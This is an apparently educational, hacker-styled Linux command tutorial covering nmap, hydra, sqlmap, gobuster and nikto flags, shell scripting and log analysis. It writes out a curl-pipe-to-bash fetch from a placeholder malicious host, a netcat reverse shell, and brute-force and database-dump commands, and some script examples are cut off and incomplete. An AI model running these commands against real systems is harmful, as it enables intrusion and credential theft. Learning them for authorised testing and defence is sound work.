üìñ COMMAND ANATOMY: How to Read Linux Commands Like a Pro

THIS IS THE MOST IMPORTANT SECTION! Linux commands look scary because they have weird flags like -sS, -A, -p. This section explains EVERY character, EVERY flag, EVERY symbol you'll see. After this, commands will make PERFECT sense.

Part 1: Basic Command Structure

The Anatomy of ANY Command:

command -flags --long-options arguments

1. Command (The Action)

The command is the program you want to run. Examples: ls (list files), grep (search), nmap (scan network).

ls ‚Üê This is the command

2. Flags/Options (How to Do It)

Flags modify how the command behaves. They start with - (single dash) for short options or -- (double dash) for long options.

ls -l ‚Üê Short flag (one letter)

ls --all ‚Üê Long flag (full word)

3. Arguments (What to Act On)

Arguments are the targets - files, directories, IP addresses, etc. What the command should work on.

cat file.txt ‚Üê file.txt is the argument

nmap 192.168.1.1 ‚Üê IP address is the argument

üî¨ Full Command Dissection Example:

nmap -sS -A -p 80,443 192.168.1.1

nmap = The command (network mapper tool for scanning)

-sS = Flag meaning "SYN scan" (stealth scan, doesn't complete TCP handshake)

-A = Flag meaning "aggressive" (OS detection + version detection + scripts)

-p = Flag meaning "ports" (which ports to scan)

80,443 = Argument for -p flag (scan ports 80 and 443)

192.168.1.1 = Final argument (the target IP address to scan)

Translation: "Hey nmap, do a stealth SYN scan with aggressive options, check ports 80 and 443 on the machine at 192.168.1.1"

Part 2: Common Flags You'll See EVERYWHERE

üîç NMAP Flags (Network Scanning)

Scan Types:
  • -sS = SYN scan (stealth, half-open scan - most common)
  • -sT = TCP Connect scan (full connection, noisier)
  • -sU = UDP scan (scan UDP ports instead of TCP)
  • -sn = Ping scan (just check if host is up, no port scan)
  • -sV = Version detection (detect service versions running)
Detection Options:
  • -O = OS detection (guess what operating system)
  • -A = Aggressive (OS + version + scripts + traceroute)
  • --script = NSE scripts (run specific Nmap scripts)
Port Specifications:
  • -p 80 = Scan only port 80
  • -p 80,443,8080 = Scan specific ports (comma-separated)
  • -p 1-1000 = Scan range of ports
  • -p- = Scan ALL 65535 ports (takes forever!)
  • --top-ports 100 = Scan most common 100 ports
Timing & Stealth:
  • -T0 to -T5 = Timing templates (0=slowest/stealthiest, 5=fastest/loudest)
  • -f = Fragment packets (evade firewalls)
  • -D = Decoy scan (make it look like multiple IPs scanning)

# Stealthy scan (slow but quiet)

nmap -sS -T2 --top-ports 20 target.com

# Aggressive full scan (fast, get everything)

nmap -sS -sV -O -A -p- target.com

# Quick common ports scan

nmap -sS -T4 -F target.com

# Vulnerability scan with scripts

nmap --script vuln -p 80,443 target.com

üí£ METASPLOIT Commands (Exploitation)

Inside msfconsole:

üîê HYDRA Flags (Brute Force)

Username & Password Options:

-l [username] = Single username (e.g., -l admin)

-L [file] = Username list (e.g., -L users.txt)

-p [password] = Single password (e.g., -p password123)

-P [file] = Password list (e.g., -P rockyou.txt)

-C [file] = Colon-separated file (username:password format)

Performance & Output:

-t [threads] = Number of parallel tasks (e.g., -t 16 = 16 threads)

-V = Verbose (show each attempt)

-f = Stop after first valid (quit when found)

-s [port] = Custom port (if not default)

# Brute force SSH

hydra -l admin -P passwords.txt ssh://192.168.1.10

# Brute force FTP (faster with threads)

hydra -L users.txt -P pass.txt -t 16 ftp://10.10.10.5

# HTTP POST form brute force

hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"

# Verbose mode (see all attempts)

hydra -l root -P rockyou.txt -V -f ssh://target.com

üíâ SQLMAP Flags (SQL Injection)

Target Options:

-u [URL] = Target URL (e.g., -u \"http://site.com/page?id=1\")

-r [file] = Load HTTP request from file (Burp Suite saved request)

--data [string] = POST data (for POST requests)

Enumeration:

--dbs = List all databases

-D [database] = Specify database (e.g., -D webapp_db)

--tables = List tables (use with -D)

-T [table] = Specify table (e.g., -T users)

--columns = List columns (use with -T)

--dump = Extract data (dump table contents)

Convenience:

--batch = Auto-answer prompts (never ask for input)

--random-agent = Random User-Agent (avoid detection)

--threads [n] = Speed up with threads

--level [1-5] = Test thoroughness (5 = most thorough)

--risk [1-3] = Risk level (3 = aggressive, may damage DB)

# Basic injection test

sqlmap -u \"http://site.com/page?id=1\"

# List databases

sqlmap -u \"http://site.com/page?id=1\" --dbs --batch

# Dump specific table

sqlmap -u \"http://site.com/page?id=1\" -D webapp_db -T users --dump

# Aggressive scan

sqlmap -u \"target.com\" --level=5 --risk=3 --batch --random-agent

# POST request with data

sqlmap -u \"http://site.com/login\" --data=\"user=admin&pass=test\" -p user

üîé NIKTO Flags (Web Server Scanner)

-h [host] = Target host (e.g., -h http://target.com)

-p [ports] = Ports to scan (e.g., -p 80,443,8080)

-ssl = Force SSL/HTTPS

-Tuning [options] = Scan categories (1=interesting files, 2=misconfig, 3=info disclosure, etc.)

-o [file] = Output to file (e.g., -o results.txt)

-Format [format] = Output format (txt, html, csv, xml)

# Basic scan

nikto -h http://target.com

# HTTPS scan on port 443

nikto -h target.com -p 443 -ssl

# Multiple ports

nikto -h 192.168.1.10 -p 80,443,8080

# Save results

nikto -h target.com -o scan_results.txt -Format txt

üìÇ GOBUSTER Flags (Directory/DNS Brute Force)

Modes:

dir = Directory/file brute force mode

dns = DNS subdomain brute force mode

vhost = Virtual host brute force mode

Directory Mode Flags:

-u [url] = Target URL (e.g., -u http://site.com)

-w [wordlist] = Wordlist file (e.g., -w /usr/share/wordlists/dirb/common.txt)

-x [extensions] = File extensions (e.g., -x php,txt,html)

-t [threads] = Number of threads (e.g., -t 50)

-s [codes] = Status codes to show (e.g., -s 200,301,302)

-k = Skip SSL certificate verification

DNS Mode Flags:

-d [domain] = Target domain (e.g., -d example.com)

-w [wordlist] = Subdomain wordlist

# Basic directory brute force

gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With file extensions

gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html

# Fast scan with 50 threads

gobuster dir -u http://target.com -w wordlist.txt -t 50

# DNS subdomain enumeration

gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Show only 200 & 301 responses

gobuster dir -u http://target.com -w wordlist.txt -s 200,301

Part 3: Special Characters & Operators

Pipes & Redirection:

| (pipe) = Send output of one command to another

Example: cat file.txt | grep "password" ‚Üí read file, then search for "password"

> (redirect) = Write output to file (overwrite)

Example: echo "hello" > file.txt ‚Üí writes "hello" to file (destroys old content)

>> (append) = Add output to end of file

Example: echo "line" >> file.txt ‚Üí adds new line to end (keeps old content)

< (input redirect) = Read input from file

Example: wc -l < file.txt ‚Üí count lines in file

2> (error redirect) = Redirect errors to file

Example: find / -name "*.txt" 2> errors.log ‚Üí save errors to log

2>&1 = Redirect errors to same place as output

Example: command > output.log 2>&1 ‚Üí save everything to one file

2>/dev/null = Hide all errors (send to void)

Example: find / -name "*.txt" 2>/dev/null ‚Üí no "Permission denied" spam

Command Chaining:

; (semicolon) = Run commands sequentially (always runs both)

Example: cd /tmp ; ls ‚Üí change directory, then list files

&& (AND) = Run second IF first succeeds

Example: mkdir test && cd test ‚Üí only cd if mkdir worked

|| (OR) = Run second IF first fails

Example: ping google.com || echo "No internet" ‚Üí show message if ping fails

& (background) = Run in background

Example: python3 server.py & ‚Üí starts server in background

Wildcards & Patterns:

* (asterisk) = Match anything (zero or more characters)

Example: ls *.txt ‚Üí lists all .txt files

Example: rm file* ‚Üí deletes file1, file2, file_old, etc.

? (question mark) = Match exactly ONE character

Example: ls file?.txt ‚Üí matches file1.txt, fileA.txt, but NOT file10.txt

[abc] = Match one character from set

Example: ls file[123].txt ‚Üí matches file1.txt, file2.txt, file3.txt

{a,b} = Match one of multiple patterns

Example: mv file.{txt,log} ‚Üí renames file.txt to file.log

Quotes & Escaping:

"text" (double quotes) = Treat as string but allow variables

Example: echo "Hello $USER" ‚Üí expands $USER variable

'text' (single quotes) = Treat as LITERAL string (no expansion)

Example: echo 'Hello $USER' ‚Üí prints literally "Hello $USER"

\ (backslash) = Escape special character

Example: echo \$5 ‚Üí prints "$5" instead of expanding variable

`cmd` or $(cmd) = Command substitution (run command, use output)

Example: echo "Today is $(date)" ‚Üí runs date command, inserts result

üéØ Real-World Command Combinations

Find all SUID binaries (privilege escalation):

find / -perm -4000 -type f 2>/dev/null

Breakdown: find / (search from root) ‚Üí -perm -4000 (SUID permission) ‚Üí -type f (files only) ‚Üí 2>/dev/null (hide errors)

Extract unique IPs from log file:

cat access.log | grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort | uniq -c | sort -nr

Breakdown: cat (read file) ‚Üí grep -oE (extract IPs with regex) ‚Üí sort (alphabetize) ‚Üí uniq -c (count duplicates) ‚Üí sort -nr (sort by count, highest first)

Download file and run immediately:

curl -s http://malicious.com/shell.sh | bash

Breakdown: curl -s (download silently) ‚Üí | (pipe to bash) ‚Üí bash (execute immediately) ‚ö†Ô∏è DANGEROUS!

Recursive grep for passwords in all files:

grep -r -i -E "password|pass|pwd|api_key|secret" /var/www/ 2>/dev/null | tee found.txt

Breakdown: grep -r (recursive) ‚Üí -i (case-insensitive) ‚Üí -E (regex) ‚Üí pattern (search terms) ‚Üí 2>/dev/null (hide errors) ‚Üí tee (show AND save)

1. Advanced File Operations: Search & Destroy

Linux is 90% text files. Mastering text manipulation is like gaining superpowers. These tools will save you HOURS of manual work.

find - The Ultimate File Hunter

find searches EVERYTHING. It's slower than locate but way more powerful.

# Find all files modified in last 7 days

find /home -type f -mtime -7

# Find files larger than 100MB

find / -type f -size +100M

# Find SUID binaries (privilege escalation gold)

find / -perm -4000 -type f 2>/dev/null

# Find writable directories (upload shells here)

find / -type d -writable 2>/dev/null

# Find and delete all .tmp files

find /tmp -name "*.tmp" -delete

# Execute command on each result

find . -name "*.log" -exec rm {} \;

üí° Hacker Tip: Always append 2>/dev/null to hide "Permission denied" errors. Keeps your scan quiet.

grep - Pattern Matching Master

grep searches INSIDE files for patterns. It's your best friend for finding passwords, API keys, and secrets.

# Basic search

grep "password" /etc/config.txt

# Case-insensitive search

grep -i "PASSWORD" file.txt

# Recursive search in all files

grep -r "API_KEY" /var/www/

# Show 3 lines before and after match (context)

grep -C 3 "admin" access.log

# Count matches

grep -c "error" /var/log/apache2/error.log

# Find lines NOT matching pattern

grep -v "^#" config.conf # Exclude comments

# Regex: Find IP addresses

grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" access.log

üéØ Real Use: grep -r "password\|api_key\|secret" /var/www/ finds hardcoded credentials in web apps.

sed - Stream Editor for Text Ninja Surgery

sed edits text WITHOUT opening a file. It's perfect for automation and scripting.

# Replace first occurrence

sed 's/old/new/' file.txt

# Replace ALL occurrences (g = global)

sed 's/old/new/g' file.txt

# Replace IN-PLACE (modify file directly)

sed -i 's/localhost/10.10.10.10/g' config.php

# Delete lines matching pattern

sed '/^#/d' file.txt # Delete comment lines

# Print only lines 10-20

sed -n '10,20p' large.log

# Insert line before pattern

sed '/pattern/i\New line above' file.txt

‚ö†Ô∏è Warning: -i flag PERMANENTLY modifies files. Test without it first!

awk - The Data Processing Powerhouse

awk is a programming language disguised as a command. It processes text column-by-column.

# Print first column

awk '{print $1}' file.txt

# Print multiple columns with custom separator

awk '{print $1 " -> " $3}' access.log

# Sum numbers in column 3

awk '{sum+=$3} END {print sum}' data.txt

# Filter rows where column 2 > 100

awk '$2 > 100' numbers.txt

# Parse CSV (comma-separated)

awk -F',' '{print $1,$3}' data.csv

# Count unique IPs in access log

awk '{print $1}' access.log | sort | uniq -c | sort -nr

üìä Common Use: Log analysis. Extract IPs, count requests, find anomalies.

2. Process Management: Control the Chaos

Every program running is a "process". As a hacker, you'll kill malicious processes, hide your own, and escalate privileges through them.

ps - Process Status

ps shows running processes. Each process has a PID (Process ID).

# Show all processes (BSD style)

ps aux

# Show process tree (parent-child relationships)

ps auxf

# Find specific process

ps aux | grep apache2

# Show processes by user

ps -u www-data

# Sort by CPU usage

ps aux --sort=-%cpu | head

# Sort by memory usage

ps aux --sort=-%mem | head

üîç Columns Explained: USER (who owns it), PID (process ID), %CPU, %MEM, COMMAND (what's running)

top/htop - Real-Time Process Monitor

top is like Task Manager for Linux. htop is prettier (install with sudo apt install htop).

# Launch interactive monitor

top

# Better version with colors

htop

# Monitor specific user

top -u www-data

Inside top: Press M to sort by memory, P for CPU, k to kill a process, q to quit.

kill - Terminate Processes

kill sends signals to processes. Most common: terminate gracefully or FORCE kill.

# Gracefully stop process (SIGTERM)

kill 1234

# FORCE kill (SIGKILL) - use when process won't die

kill -9 1234

# Kill by process name

killall apache2

# Kill all processes by user

pkill -u username

# Kill all matching pattern

pkill -f "python.*server"

‚ö†Ô∏è Danger: kill -9 -1 kills EVERYTHING (including your session). Never run this!

Background Jobs & Job Control

Run commands in background, pause them, bring them back. Essential for multitasking.

# Run command in background (& at end)

python3 server.py &

# Pause running command (Ctrl+Z)

[Ctrl+Z] # Pauses current process

# Resume in background

bg

# Bring back to foreground

fg

# List background jobs

jobs

# Resume specific job

fg %1 # Bring job #1 to foreground

# Run command even after logout (nohup)

nohup python3 server.py > output.log 2>&1 &

üí° Hacker Use: Start reverse shell in background: nc -e /bin/bash 10.10.10.5 4444 &

3. Shell Scripting: Automate Everything

Why click 100 times when you can script it once? Shell scripts are mini-programs that automate tasks. Every hacker has a toolkit of scripts.

Script Basics

# Create script file

nano myscript.sh

# First line MUST be shebang (tells system which interpreter to use)

#!/bin/bash

echo "Hello, World!"

# Make executable

chmod +x myscript.sh

# Run script

./myscript.sh

Variables & User Input

#!/bin/bash

# Variables (no spaces around =)

NAME="John"

AGE=25

echo "Hello, $NAME. You are $AGE years old."

# User input

read -p "Enter target IP: " IP

echo "Scanning $IP..."

# Command substitution

CURRENT_USER=$(whoami)

echo "Current user: $CURRENT_USER"

# Arguments

echo "Script name: $0"

echo "First arg: $1"

echo "All args: $@"

Conditionals (if/else)

#!/bin/bash

if [ "$1" == "admin" ]; then

echo "Welcome, admin!"

elif [ "$1" == "user" ]; then

echo "Welcome, user"

else

echo "Unknown user"

fi

# File checks

if [ -f "file.txt" ]; then

echo "File exists"

fi

# Number comparisons

if [ $AGE -gt 18 ]; then # -gt = greater than

echo "Adult"

fi

Common tests: -f (file exists), -d (directory), -z (empty string), -n (not empty)

Loops (for & while)

# For loop - iterate over list

for i in 1 2 3 4 5; do

echo "Number: $i"

done

# For loop - range

for i in {1..10}; do

echo "Count: $i"

done

# Loop through files

for file in *.txt; do

echo "Processing $file"

done

# While loop

counter=1

while [ $counter -le 5 ]; do

echo "Loop $counter"

((counter++))

done

# Read file line by line

while IFS= read -r line; do

echo "Line: $line"

done < file.txt

Functions

#!/bin/bash

function greet() {

echo "Hello, $1!"

}

greet "Alice" # Call function

# Function with return value

function add() {

result=$(($1 + $2))

echo $result

}

sum=$(add 5 3)

echo "Sum: $sum"

#!/bin/bash

# Simple port scanner

read -p "Enter target IP: " TARGET

echo "Scanning $TARGET..."

timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && \

‚úÖ This works! Save as portscan.sh, make executable, run: ./portscan.sh

Error Handling & Debugging

#!/bin/bash

# Enable strict error handling

cleanup() {

log() {

Parallel Processing for Speed

Process multiple targets simultaneously using GNU Parallel:

# Sequential (slow) - one at a time

while read ip; do nmap $ip; done < ips.txt


# Parallel (FAST) - 10 at once

parallel -j 10 nmap {} :::: ips.txt


# Ping sweep 100 IPs in parallel

seq 1 100 | parallel -j 50 'ping -c1 192.168.1.{} | grep "bytes from"'


# Download multiple files at once

cat urls.txt | parallel -j 20 wget {}


# Crack passwords in parallel

parallel -j 4 hydra -l admin -p {} 192.168.1.1 ssh :::: passwords.txt

8. Log Analysis & Digital Forensics

Logs tell the story of what happened. As a hacker, you hunt for clues. As a defender, you hunt for attacks.

Critical Log Files

# Authentication logs (failed logins, sudo usage)

/var/log/auth.log # Debian/Ubuntu

/var/log/secure # RedHat/CentOS


# System messages

/var/log/syslog # General system log

/var/log/messages # RedHat systems


# Kernel ring buffer

dmesg # Hardware/driver messages


# Web server logs

/var/log/apache2/access.log

/var/log/nginx/access.log


# Last logins

last # Show login history

lastb # Show bad login attempts

w # Who's logged in now

Hunting for Suspicious Activity

# Find failed SSH login attempts

grep "Failed password" /var/log/auth.log


# Count attempts by IP

grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr


# Find successful root logins

grep "session opened for user root" /var/log/auth.log


# Check for new users added

grep "useradd" /var/log/auth.log


# Find large file transfers (potential data exfiltration)

awk '$10 > 10000000' /var/log/apache2/access.log


# Detect port scans

grep "SYN" /var/log/syslog | awk '{print $NF}' | sort | uniq -c | sort -nr | head -20


# Find commands run with sudo

grep "sudo.*COMMAND" /var/log/auth.log


# Check for reverse shells (common backdoor ports)

netstat -antp | grep -E ":(4444|5555|6666|7777|8888|9999)"

‚ö†Ô∏è Red Flag: Multiple failed logins from same IP = brute force attack. Successful login after failures = possible compromise!

Timeline Analysis for Incident Response

Reconstruct what happened during a breach:

# Create timeline of all security events
